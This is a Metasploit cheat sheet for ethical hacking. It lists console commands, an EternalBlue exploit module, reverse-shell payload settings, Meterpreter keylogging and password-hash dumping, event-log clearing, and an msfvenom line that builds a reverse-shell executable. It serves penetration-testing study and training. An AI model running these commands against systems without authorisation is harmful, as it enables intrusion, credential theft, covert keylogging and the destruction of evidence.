
# Metasploit Cheatsheet for Ethical Hacking

## Table of Contents

* [Getting Started](#getting-started)
* [Core Components](#core-components)
* [Common Commands](#common-commands)
* [Modules](#modules)
* [Payloads](#payloads)
* [Meterpreter Basics](#meterpreter-basics)
* [Post Exploitation](#post-exploitation)
* [Auxiliary Modules](#auxiliary-modules)
* [Database Usage](#database-usage)
* [Useful Tips](#useful-tips)

---

## Getting Started

```bash
msfconsole          # Launch Metasploit Framework console
msfupdate           # Update Metasploit
```

## Core Components

* **Exploit**: Code that takes advantage of a vulnerability
* **Payload**: Code executed after exploit succeeds (e.g., shell)
* **Auxiliary**: Scanners, fuzzers, etc. (non-exploit modules)
* **Post**: Modules for post-exploitation tasks
* **Encoders**: Obfuscate payloads

## Common Commands

```bash
search <term>                 # Search for modules
use <module>                  # Use a specific module
info                          # Get info on the module
show options                  # Show required options
set <opt> <val>               # Set value for an option
unset <opt>                   # Unset an option
show payloads                 # List compatible payloads
set PAYLOAD <payload>         # Set a payload
exploit / run                 # Launch the exploit/module
check                         # Check if the target is vulnerable
back                          # Exit current module
exit                          # Exit msfconsole
```

## Modules

### Types of Modules

```bash
exploit/windows/smb/ms17_010_eternalblue   # Exploit example
auxiliary/scanner/portscan/tcp             # Port scanner
post/windows/gather/enum_logged_on_users   # Post exploitation
```

### Finding Modules

```bash
search type:exploit name:ftp
search platform:windows
```

## Payloads

### Types of Payloads

* **Bind**: Opens a port on the target
* **Reverse**: Connects back to the attacker (common)

### Examples

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT <port>
```

## Meterpreter Basics

```bash
sysinfo              # Get system info
getuid               # Show current user
shell                # Drop into a system shell
background           # Background session
sessions             # List active sessions
sessions -i <id>     # Interact with a session
upload <src> <dst>   # Upload file
download <src>       # Download file
screenshot           # Take a screenshot
keyscan_start        # Start keylogger
keyscan_dump         # Dump keystrokes
hashdump             # Dump password hashes
```

## Post Exploitation

```bash
use post/windows/gather/hashdump
set SESSION <id>
run

use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

## Auxiliary Modules

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set THREADS 10
run
```

Other useful auxiliaries:

* `scanner/ftp/ftp_login`
* `scanner/http/title`
* `scanner/ssh/ssh_version`
* `scanner/smb/smb_version`

## Database Usage

```bash
db_status               # Check DB connection
workspace -a <name>     # Add new workspace
workspace <name>        # Switch workspace
hosts                   # Show scanned hosts
services                # Show discovered services
vulns                   # Show vulnerabilities
notes                   # Show notes added
loot                    # List loot
```

## Useful Tips

* Use `setg` to set global options across all modules:

```bash
setg LHOST <your_ip>
```

* Save output logs:

```bash
spool /path/to/output.txt
```

* Clean up after a session:

```bash
clearev     # Clear event logs
```

* Generate standalone payloads:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o payload.exe
```
